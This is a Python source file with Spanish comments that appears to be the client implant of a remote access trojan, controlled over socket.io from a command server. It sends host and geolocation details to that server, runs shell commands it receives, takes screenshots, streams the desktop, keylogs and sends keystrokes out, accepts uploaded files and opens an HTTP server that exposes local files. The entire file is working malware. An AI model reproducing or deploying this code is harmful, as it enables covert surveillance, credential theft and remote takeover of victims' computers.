#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________
import requests
import socket
import platform
import json
import time
import socketio
import subprocess
from cryptography.fernet import Fernet
import base64
import pyautogui
import keyboard
import threading
from io import BytesIO
from PIL import Image
import time
import io
import cv2
import os
import http.server
import socketserver


# Clave AES compartida con el servidor
SECRET_KEY = b'q8A7E1x2XmNnWlBhFqZpL4d6KNZTSPBJaIrjNGYdHbA='  # Debe ser la misma clave
cipher = Fernet(SECRET_KEY)


keylog_data = ""
keylogger_running = False
streaming = True
PORT = 9000

sio = socketio.Client()

@sio.event
def connect():
    print("Conectado al servidor")
    def obtener_datos():
        ip_info = requests.get("https://ipinfo.io/json").json()
        return {
            "ip_publica": ip_info.get("ip", "Desconocida"),
            "ubicacion": ip_info.get("loc", "0,0"),
            "sistema": platform.system(),
            "version": platform.version(),
            "arquitectura": platform.architecture()[0],
            "procesador": platform.processor(),
            "nombre_equipo": socket.gethostname()
        }


    datos_cliente = obtener_datos()
    sio.emit("registrar_cliente", datos_cliente)
    print(f"[+] Datos enviados al servidor: {datos_cliente}")
    while True:
        time.sleep(30)

@sio.on('execute_command')
def execute_command(encrypted_command):
    command = cipher.decrypt(encrypted_command.encode()).decode()
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
        output, error = process.communicate()
        if error:
            output += "\n" + error
    except Exception as e:
        output = str(e)
    encrypted_output = cipher.encrypt(output.encode())
    sio.emit('command_output', encrypted_output.decode())

@sio.on('screenshot_command')
def screenshot_in():
    print(f'Recibiendo datos del servidor....')
    
    try:
        print("Capturando pantalla...")
        screenshot = pyautogui.screenshot()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        command_2 = base64.b64encode(buffer.getvalue()).decode()
        print("Captura tomada y enviada al servidor")
        sio.emit('screenshot_output', command_2)
    except Exception as e:
        print("Error en captura de pantalla:", str(e))    


@sio.on('start_keylogger')
def start_keylogger():
    global keylogger_running
    keylogger_running = True
    threading.Thread(target=keylogger, daemon=True).start()

@sio.on('stop_keylogger')
def stop_keylogger():
    global keylogger_running
    keylogger_running = False
    print("Keylogger detenido.")

def keylogger():
    global keylog_data
    while keylogger_running:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            keylog_data += event.name + ' '
            encrypted_data = cipher.encrypt(keylog_data.encode()).decode()
            sio.emit('keylog_data', encrypted_data)

@sio.on('start_remote_desktop_client')
def start_streaming():
    global streaming
    while streaming:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG")
        image_base64 = base64.b64encode(buffer.getvalue()).decode("utf-8")

        sio.emit("remote_desktop", image_base64)
        time.sleep(0.1)

@sio.on('stop_remote_desktop_client')
def stop_streaming():
    global streaming
    streaming = False
    print("Streaming de escritorio detenido.")

@sio.on("receive_file")
def receive_file(data):
    print("Archivo Enviado..........")
    filename = data["filename"]
    file_data = base64.b64decode(data["data"])
    
    os.makedirs("descargas", exist_ok=True)  # Crear carpeta si no existe
    filepath = os.path.join("descargas", filename)
    
    with open(filepath, "wb") as f:
        f.write(file_data)
    
    print(f"[*] Archivo {filename} recibido y guardado en {filepath}")

@sio.on("get_file")
def send_file():
    # Obtener la dirección IP local
    print(f'Activando servidor de descarga de archivos')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = "127.0.0.1"
    finally:
        s.close()

    handler = http.server.SimpleHTTPRequestHandler

    # Redefinir el método do_GET sin usar funciones
    original_do_GET = handler.do_GET

    def custom_do_GET(self):
        if self.path == '/shutdown':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Servidor detenido.")
            print("Recibida petición de apagado. Deteniendo el servidor...")
            threading.Thread(target=httpd.shutdown).start()
        else:
            original_do_GET(self)

    # Reemplazar el método do_GET
    handler.do_GET = custom_do_GET

    # Iniciar el servidor
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"Servidor HTTP activo en la URL:")
        print(f"  http://{ip_address}:{PORT}/")
        print(f"Para detener el servidor, accede a: http://{ip_address}:{PORT}/shutdown")
        server_data = "  El servidor de descarga esta activado en la direccion: " + "http://" + str(ip_address) + ":" + str(PORT)
        encrypted_data = cipher.encrypt(server_data.encode()).decode()
        sio.emit('send_file_', encrypted_data)
    
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Servidor detenido por KeyboardInterrupt.")

sio.connect('http://ip:5000')
sio.wait()